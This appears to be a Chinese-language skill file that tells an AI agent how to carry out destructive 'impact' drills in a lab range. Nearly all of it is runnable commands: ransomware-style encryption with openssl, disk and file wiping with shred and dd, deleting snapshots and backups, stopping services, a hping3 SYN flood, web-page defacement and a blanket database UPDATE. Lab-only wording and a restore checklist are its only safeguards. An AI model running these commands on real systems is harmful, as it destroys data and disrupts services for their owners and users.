---
name: m-impact
description: "破坏/Impact：勒索加密、数据销毁、DoS、篡改、业务中断、磁盘擦除。"
---

# m-impact · 破坏 / Impact

被读到时：主人要在靶场里做破坏演练：勒索、销毁、停机、篡改。

## 顺序

定目标 → 选破坏类型 → 执行 → 记录影响面 → 还原

## 一、勒索加密演练

```bash
# 自写加密脚本（本地靶机，别用真实勒索样本）
# 遍历目标目录 → AES 加密 → 写勒索信
openssl enc -aes-256-cbc -salt -pass pass:KEY -in target.txt -out target.txt.enc
# 关键：加密前先备份，演练后能还原
```

## 二、数据销毁

```bash
# 擦除（Linux）
shred -vfz target
dd if=/dev/zero of=/dev/sdX bs=1M
# 删快照 / 删备份
```

## 三、DoS / 业务中断

```bash
# 服务停摆
systemctl stop <service>
# 资源耗尽（测试机）
stress --cpu 8 --timeout 60s
# 网络层（靶场）
hping3 --flood -S -p 80 TARGET
```

## 四、篡改

```bash
# 网页篡改（自建靶场）
echo "HACKED" > /var/www/html/index.html
# 数据篡改（数据库）
UPDATE orders SET status='x';
```

## 五、验收与还原

- 记录每个破坏动作的影响面（哪些服务、哪些数据）
- 每个动作配一个还原命令
- 演练完按还原命令恢复，确认无损

破坏类只在自建靶场做。工具用系统自带（openssl/shred/dd/stress/hping3）。
